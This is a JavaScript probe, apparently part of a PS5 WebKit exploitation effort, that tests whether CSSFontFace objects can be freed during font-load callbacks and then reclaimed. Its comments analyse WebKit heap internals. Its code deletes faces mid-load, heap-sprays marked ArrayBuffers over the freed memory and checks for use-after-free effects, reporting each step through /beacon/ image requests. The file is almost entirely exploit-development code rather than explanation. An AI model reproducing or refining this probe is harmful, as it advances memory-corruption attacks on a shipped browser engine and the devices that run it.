// p300 - CSSFontFaceSet diagnostic: font load timing + delete-during-iteration
//
// Tests whether ArrayBuffer FontFace loading is synchronous on PS5,
// whether document.fonts.delete() during load callbacks is possible,
// and what the exact timing of promise resolution is relative to
// individual face.load() calls.
//
// Source analysis shows:
// - CSSFontFace uses IsoHeap (WTF_MAKE_FAST_ALLOCATED_WITH_HEAP_IDENTIFIER)
//   so freed CSSFontFace memory can only be reused by other CSSFontFace allocs
// - matchingFacesExcludingPreinstalledFonts returns Vector<reference_wrapper>
//   (non-owning) but is used entirely within synchronous C++ code
// - For ArrayBuffer fonts, CSSFontFaceSource::load() is synchronous
//   (lines 173-178 of CSSFontFaceSource.cpp)
// - Promise resolution is microtask, should not fire during C++ load loop
//
// This probe empirically verifies these timing assumptions on device.
//
// Beacon prefix: V300-

(function() {
  function B(tag) {
    try { new Image().src = '/beacon/V300-' + tag + '?t=' + Date.now(); } catch(e) {}
  }

  B('BOOT');

  // Phase A: Fetch font data as ArrayBuffer
  var fontData = null;
  try {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '/document/al/ps5/f0.ttf', false);
    xhr.responseType = 'arraybuffer';
    xhr.send();
    if (xhr.status === 200 && xhr.response) {
      fontData = xhr.response;
      B('A-FONT-' + fontData.byteLength + 'B');
    } else {
      B('A-FONT-FAIL-' + xhr.status);
      return;
    }
  } catch(e) {
    B('A-FONT-ERR-' + e.message.substring(0, 30));
    return;
  }

  // Phase B: Test basic FontFace API with ArrayBuffer
  var faces = [];
  var N = 10;
  try {
    for (var i = 0; i < N; i++) {
      var copy = fontData.slice(0);
      var f = new FontFace('testfam' + i, copy);
      faces.push(f);
    }
    B('B-CREATED-' + faces.length);
  } catch(e) {
    B('B-CREATE-ERR-' + e.message.substring(0, 30));
    return;
  }

  // Phase C: Add to document.fonts and check status
  var addCount = 0;
  for (var i = 0; i < faces.length; i++) {
    try {
      document.fonts.add(faces[i]);
      addCount++;
    } catch(e) {
      B('C-ADD-ERR-' + i + '-' + e.message.substring(0, 20));
    }
  }
  B('C-ADDED-' + addCount);
  B('C-STATUS-PRE-' + document.fonts.status);

  // Phase D: Test individual face.load() timing
  // Track whether status changes synchronously
  var loadOrder = [];
  var promiseOrder = [];
  var promiseSeq = 0;

  for (var i = 0; i < faces.length; i++) {
    (function(idx, face) {
      face.loaded.then(function() {
        promiseOrder.push(idx);
        promiseSeq++;
      });
    })(i, faces[i]);
  }

  // Now call load on each face individually and check sync behavior
  for (var i = 0; i < faces.length; i++) {
    var statusBefore = faces[i].status;
    try {
      faces[i].load();
    } catch(e) {
      B('D-LOAD-ERR-' + i + '-' + e.message.substring(0, 20));
    }
    var statusAfter = faces[i].status;
    loadOrder.push(statusBefore + '->' + statusAfter);

    // Check if any promises resolved synchronously
    if (promiseOrder.length > 0) {
      B('D-SYNC-PROMISE-' + i + '-' + promiseOrder.join(','));
    }
  }
  B('D-LOAD-ORDER-' + loadOrder.slice(0, 5).join('|'));
  B('D-STATUS-POST-' + document.fonts.status);
  B('D-PROMISES-SYNC-' + promiseOrder.length);

  // Phase E: Test document.fonts.load() API timing
  // This calls matchingFacesExcludingPreinstalledFonts internally
  var loadPromiseResolved = false;
  var deleteCount = 0;

  // Create fresh faces for this test
  var faces2 = [];
  for (var i = 0; i < 10; i++) {
    var f2 = new FontFace('loadtest' + i, fontData.slice(0));
    faces2.push(f2);
    document.fonts.add(f2);
  }
  B('E-ADDED-' + faces2.length);

  // Set up promise handler to delete faces during load
  for (var i = 0; i < faces2.length; i++) {
    (function(idx) {
      faces2[idx].loaded.then(function() {
        // Try to delete OTHER faces during this callback
        for (var j = idx + 1; j < faces2.length; j++) {
          try {
            var result = document.fonts.delete(faces2[j]);
            if (result) deleteCount++;
          } catch(e) {}
        }
        if (deleteCount > 0) {
          B('E-DELETED-' + deleteCount + '-DURING-LOADED-' + idx);
        }
      });
    })(i);
  }

  // Trigger the load through document.fonts.load()
  var loadStartTime = Date.now();
  document.fonts.load('12px loadtest0').then(function(result) {
    loadPromiseResolved = true;
    var elapsed = Date.now() - loadStartTime;
    B('E-LOAD-RESOLVED-' + elapsed + 'ms-' + result.length + 'faces');
    B('E-DELETED-TOTAL-' + deleteCount);

    // Phase F: Check document.fonts size after deletions
    B('F-FONTS-SIZE-' + document.fonts.size);
    B('F-STATUS-' + document.fonts.status);

    // Phase G: Test if we can detect freed CSSFontFace access
    // Create and immediately delete faces, then check for side effects
    var ephemeral = [];
    for (var k = 0; k < 20; k++) {
      var ef = new FontFace('ephemeral' + k, fontData.slice(0));
      document.fonts.add(ef);
      ephemeral.push(ef);
    }
    B('G-EPHEMERAL-ADDED-20');

    // Load them all
    var loadedCount = 0;
    var ephPromises = ephemeral.map(function(ef) {
      return ef.load().then(function() { loadedCount++; });
    });

    Promise.all(ephPromises).then(function() {
      B('G-ALL-LOADED-' + loadedCount);

      // Delete all ephemeral faces
      for (var k = 0; k < ephemeral.length; k++) {
        document.fonts.delete(ephemeral[k]);
      }
      B('G-ALL-DELETED');

      // Spray ArrayBuffers to see if we can reclaim memory
      // (IsoHeap should prevent this, but test empirically)
      var sprayBufs = [];
      for (var s = 0; s < 500; s++) {
        var ab = new ArrayBuffer(256);
        var dv = new DataView(ab);
        dv.setUint32(0, 0xC0FECAFE, true);
        dv.setUint32(4, 0xDEAD0000 + s, true);
        sprayBufs.push(ab);
      }
      B('G-SPRAYED-' + sprayBufs.length);

      // Check if any ephemeral face properties read sprayed data
      // (this tests IsoHeap isolation)
      var weirdCount = 0;
      for (var k = 0; k < ephemeral.length; k++) {
        try {
          var fam = ephemeral[k].family;
          if (fam !== 'ephemeral' + k) {
            weirdCount++;
            B('G-WEIRD-' + k + '-' + String(fam).substring(0, 30));
          }
        } catch(e) {
          // Expected if face was properly cleaned up
        }
      }
      B('G-WEIRD-COUNT-' + weirdCount);
      B('DONE');
    });
  }).catch(function(err) {
    B('E-LOAD-REJECTED-' + err.message.substring(0, 30));
    B('DONE');
  });

  // Timeout safety
  setTimeout(function() {
    if (!loadPromiseResolved) {
      B('TIMEOUT-NO-RESOLVE');
      B('D-PROMISES-AFTER-' + promiseOrder.length);
      B('DONE');
    }
  }, 15000);

})();
